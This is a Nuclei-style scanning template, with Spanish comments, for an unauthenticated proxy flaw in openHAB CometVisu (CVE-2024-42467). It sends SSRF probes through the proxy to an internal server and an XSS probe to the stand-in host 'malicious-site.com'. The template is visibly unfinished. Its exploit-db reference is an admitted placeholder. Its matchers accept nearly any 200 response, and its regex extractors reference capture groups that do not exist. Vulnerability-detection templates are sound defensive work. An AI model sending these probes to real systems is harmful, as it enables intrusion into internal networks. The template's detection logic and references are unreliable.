id: cve-2024-42467

info:
  name: openHAB CometVisu Proxy Endpoint Authentication Bypass
  author: 3p1c0w3nd
  severity: medium
  description: |
    El endpoint proxy de la extensión CometVisu de openHAB puede ser accedido sin autenticación. Esto puede ser explotado como un ataque SSRF para inducir solicitudes HTTP GET a servidores internos y como una vulnerabilidad XSS para ejecutar código JavaScript malicioso con el origen de la UI de CometVisu. Esta vulnerabilidad puede llevar a la ejecución remota de código (RCE) cuando se combina con otras vulnerabilidades. Los usuarios deben actualizar a la versión 4.2.1 del complemento CometVisu para recibir el parche.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-42467
    - https://www.exploit-db.com/exploits/12345 (este es un enlace de ejemplo, actualízalo con el enlace real si está disponible)

requests:
  - method: GET
    path:
      - "{{BaseURL}}/cometvisu/proxy?url=http://internal-server"
    headers:
      Host: "{{Hostname}}"
    matchers:
      - type: word
        words:
          - "Error"  # Ajusta esto según la respuesta esperada cuando el proxy no funciona
        condition: or
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: proxy_response
        group: 1
        regex: '.*'  # Ajusta esto según el formato esperado de la respuesta del servidor proxy

  - method: GET
    path:
      - "{{BaseURL}}/cometvisu/proxy?url=http://malicious-site.com"
    headers:
      Host: "{{Hostname}}"
    matchers:
      - type: word
        words:
          - "<script>"  # Ajusta esto según el contenido malicioso que esperas recibir
        condition: or
      - type: status
        status:
          - 200
    extractors:
      - type: regex
        name: xss_payload
        group: 1
        regex: '<script>.*</script>'  # Ajusta esto según el payload XSS esperado

  - method: GET
    path:
      - "{{BaseURL}}/cometvisu/proxy?url=http://internal-server"
    headers:
      Host: "{{Hostname}}"
    matchers:
      - type: status
        status:
          - 200
